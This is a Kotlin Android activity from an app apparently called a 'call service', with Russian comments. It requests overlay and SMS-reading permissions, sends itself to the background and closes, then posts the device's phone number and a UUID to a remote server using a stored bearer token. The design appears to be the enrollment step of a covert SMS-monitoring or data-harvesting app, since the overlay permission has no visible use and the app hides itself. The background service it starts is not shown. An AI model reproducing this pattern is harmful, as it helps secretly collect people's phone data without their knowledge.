package com.example.callservice

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.Log
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import org.json.JSONObject
import java.io.IOException
import java.util.UUID

class MainActivity : AppCompatActivity() {

    private lateinit var overlayPermissionLauncher: ActivityResultLauncher<Intent>
    private lateinit var smsPermissionLauncher: ActivityResultLauncher<String>
    private val REQUEST_CODE_CALL_PHONE = 102

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Регистрация ActivityResultLauncher для разрешения на работу поверх других приложений
        overlayPermissionLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            if (Settings.canDrawOverlays(this)) {
                setupSmsPermission()
            } else {
                finish()
            }
        }

        // Регистрация ActivityResultLauncher для разрешения на чтение SMS
        smsPermissionLauncher = registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
            if (isGranted) {
                startMyService()
            } else {
                finish()
            }
        }

        setupOverlayPermission()
    }

    private fun setupOverlayPermission() {
        if (!Settings.canDrawOverlays(this)) {
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
            overlayPermissionLauncher.launch(intent)
        } else {
            setupSmsPermission()
        }
    }

    @SuppressLint("HardwareIds")
    private fun getPhoneNumber(): String? {
        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        return if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
            val phoneNumber = telephonyManager.line1Number
            Log.d("MyService", "Phone number retrieved: $phoneNumber")
            phoneNumber
        } else {
            Log.e("MyService", "Permission to read phone state is not granted")
            null
        }
    }

    private fun setupSmsPermission() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            smsPermissionLauncher.launch(Manifest.permission.READ_SMS)
        } else {
            startMyService()
        }
    }

    private fun startMyService() {
        MyService.scheduleNextJob(this)
        moveTaskToBack(true)  // Уходит в фон
        finish()

        // Генерация UUID
        val uuid = UUID.randomUUID().toString()
        Log.d("MyService", "UUID успешно сохранён в базу данных: $uuid")
        // Здесь добавляем вызов функции отправки номера и UUID в API
        sendPhoneNumberAndUUIDToApi(getPhoneNumber(), uuid)
    }

    private fun sendPhoneNumberAndUUIDToApi(phoneNumber: String?, uuid: String) {
        val client = OkHttpClient()
        val bearerToken = getString(R.string.bearer_token)
        val apiBaseUrl = getString(R.string.api_base_url)
        val registerEndpoint = getString(R.string.register_endpoint)
        val registerUrl = "$apiBaseUrl$registerEndpoint"

        val jsonObject = JSONObject().apply {
            put("uuid", uuid)
            put("phone_number", phoneNumber ?: "")
        }

        val requestBody = RequestBody.create(
            "application/json; charset=utf-8".toMediaTypeOrNull(),
            jsonObject.toString()
        )

        val request = Request.Builder()
            .url(registerUrl)
            .post(requestBody)
            .addHeader("Authorization", bearerToken)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                e.printStackTrace()
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    val responseData = response.body?.string()
                    println("Response: $responseData")
                    // Сохраняем UUID в базу данных при успешном ответе
                    saveUUIDToDatabase(uuid)
                } else {
                    println("Response error: ${response.code}")
                }
            }
        })
    }

    private fun saveUUIDToDatabase(uuid: String) {
        val dbHelper = DatabaseHelper(this)
        val isSuccess = dbHelper.addUUID(uuid)
        if (isSuccess) {
            Log.d("MyService", "UUID успешно сохранён в базу данных: $uuid")
        } else {
            Log.e("MyService", "Не удалось сохранить UUID в базу данных")
        }
    }

    private fun makePhoneCall() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CALL_PHONE), REQUEST_CODE_CALL_PHONE)
        } else {
            val phoneNumber = "tel:1234567890"
            val intent = Intent(Intent.ACTION_CALL, Uri.parse(phoneNumber))
            startActivity(intent)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            REQUEST_CODE_CALL_PHONE -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    makePhoneCall()
                }
            }
        }
    }
}
